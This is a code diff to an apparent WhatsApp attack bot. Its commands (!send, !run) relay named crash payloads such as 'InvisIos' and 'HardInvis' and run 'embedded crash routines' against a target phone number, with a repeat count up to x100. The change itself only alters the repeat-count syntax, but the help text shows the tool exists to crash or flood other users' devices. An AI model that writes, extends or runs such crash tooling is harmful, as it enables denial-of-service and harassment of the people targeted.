@@ -1613,9 +1613,10 @@ const commands = {
         await conn.sendMessage(from, { text: `[!send] invalid target: ${matched.rest[0]}` })
         return
       }
-      // Optional repeat count as the last arg (e.g. !send InvisIos 2348012345678 50)
+      // Repeat count is prefixed with 'x' so it can't be confused with the
+      // target number (e.g. !send InvisIos 2348012345678 x50).
       const maybeCount = matched.rest[1]
-      const count = maybeCount && /^\d+$/.test(maybeCount) ? parseInt(maybeCount, 10) : 1
+      const count = maybeCount && /^x\d+$/i.test(maybeCount) ? parseInt(maybeCount.slice(1), 10) : 1
       const raw = typeof matched.value === 'function' ? matched.value() : matched.value
       const wmsg = generateWAMessageFromContent(target, raw, {})
       const bytes = wireSize(wmsg)
@@ -1644,7 +1645,8 @@ const commands = {
       }
       const first = matched.rest[1]
       const opts = {}
-      if (first && /^\d+$/.test(first)) opts.count = parseInt(first, 10)
+      // Count is prefixed with 'x' (e.g. !run HardInvis 2348012345678 x100)
+      if (first && /^x\d+$/i.test(first)) opts.count = parseInt(first.slice(1), 10)
       // Obtained functions accept (sock, target); embedded routines accept (target).
       const result = matched.fn.length >= 2
         ? await matched.fn(conn, target, opts)
@@ -1724,10 +1726,10 @@ const commands = {
         `• *!stats*\n  Shows command usage, active sessions, uptime and memory.\n\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `📦 *PAYLOAD COMMANDS*\n\n` +
-        `• *!send <payload> <jid>*\n  Builds a payload with generateWAMessageFromContent and relays it ` +
-        `to the target. Logs the protobuf wire size.\n  Example: !send blanknotif 2348012345678\n\n` +
-        `• *!run <routine> <jid> [count]*\n  Invokes an embedded crash routine against the target. ` +
-        `Optional trailing number loops it that many times.\n  Example: !run HardInvis 2348012345678 100\n\n` +
+        `• *!send <payload> <jid> [x<count>]*\n  Builds a payload and relays it to the target. ` +
+        `Append x<count> to repeat (e.g. !send InvisIos 2348012345678 x50).\n  Logs the protobuf wire size.\n\n` +
+        `• *!run <routine> <jid> [x<count>]*\n  Invokes an embedded crash routine against the target. ` +
+        `Append x<count> to loop it (e.g. !run HardInvis 2348012345678 x100).\n\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `📞 *CALL COMMANDS*\n\n` +
         `• *!calltest <jid>*\n  Sends one call offer (native offerCall, raw node fallback).\n\n` +
